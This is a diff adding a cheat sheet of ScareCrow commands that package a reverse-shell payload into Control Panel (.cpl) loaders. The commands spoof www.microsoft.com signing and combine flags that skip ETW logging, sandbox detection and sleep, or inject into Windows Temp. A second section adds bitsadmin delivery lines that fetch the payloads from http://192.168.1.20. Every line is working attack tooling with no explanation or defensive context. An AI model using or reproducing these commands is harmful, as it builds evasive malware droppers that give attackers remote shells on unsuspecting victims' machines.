@@ -1,0 +1,40 @@
+Control Panel Local Payloads
+
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -sandbox -O payload_rev_tcp_sandbox.cpl 
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -nosleep -O payload_rev_tcp_nosleep.cpl 
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -noetw -O payload_rev_tcp_noetw.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -O payload_rev_tcp_injection.cpl  
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -unmodified -O payload_rev_tcp_unmod.cpl 
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -sandbox -unmodified -O payload_rev_tcp_unmod_sandbox.cpl 
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -nosleep -sandbox -unmodified -O payload_rev_tcp_unmod_sanbox_nosleep.cpl 
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp_unmod_sandbox_nosleep_noetw.cpl 
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -noetw -nosleep -O payload_rev_tcp_nosleep_noetw.cpl 
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -noetw -nosleep -sandbox -O payload_rev_tcp_sandbox_nosleep_noetw.cpl 
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -nosleep -sandbox -O payload_rev_tcp_inject_sandbox_nosleep_noetw.cpl 
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -sandbox -O payload_rev_tcp_inject_sandbox.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -O payload_rev_tcp_inject_noetw.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -nosleep -O payload_rev_tcp_inject_nosleep.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -unmodified -O payload_rev_tcp_inject_unmod.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -nosleep -sandbox -O payload_rev_tcp_sandbox_nosleep.cpl 
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp_all.cpl 
+
+Control Panel Delivery Bitsadmin
+
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -sandbox -O payload_rev_tcp_sandbox.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_sandbox.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -nosleep -O payload_rev_tcp_nosleep.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_nosleep.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -noetw -O payload_rev_tcp_noetw.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_noetw.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -O payload_rev_tcp_injection.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_injection.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -unmodified -O payload_rev_tcp_unmod.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_unmod.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -sandbox -unmodified -O payload_rev_tcp_unmod_sandbox.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_unmod_sandbox.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -nosleep -sandbox -unmodified -O payload_rev_tcp_unmod_sanbox_nosleep.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_unmod_sanbox_nosleep.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp_unmod_sandbox_nosleep_noetw.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_unmod_sandbox_nosleep_noetw.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -noetw -nosleep -O payload_rev_tcp_nosleep_noetw.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_nosleep_noetw.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -noetw -nosleep -sandbox -O payload_rev_tcp_sandbox_nosleep_noetw.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_sandbox_nosleep_noetw.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -nosleep -sandbox -O payload_rev_tcp_inject_sandbox_nosleep_noetw.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_inject_sandbox_nosleep_noetw.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -sandbox -O payload_rev_tcp_inject_sandbox.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_inject_sandbox.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -O payload_rev_tcp_inject_noetw.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_inject_noetw.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -nosleep -O payload_rev_tcp_inject_nosleep.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_inject_nosleep.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -unmodified -O payload_rev_tcp_inject_unmod.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_inject_unmod.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -nosleep -sandbox -O payload_rev_tcp_sandbox_nosleep.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_sandbox_nosleep.cpl
+./ScareCrow -I payload.bin -Loader control -domain www.microsoft.com -injection "C:\Windows\Temp\" -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp_all.cpl -delivery bits -url http://192.168.1.20/payload_rev_tcp_all.cpl
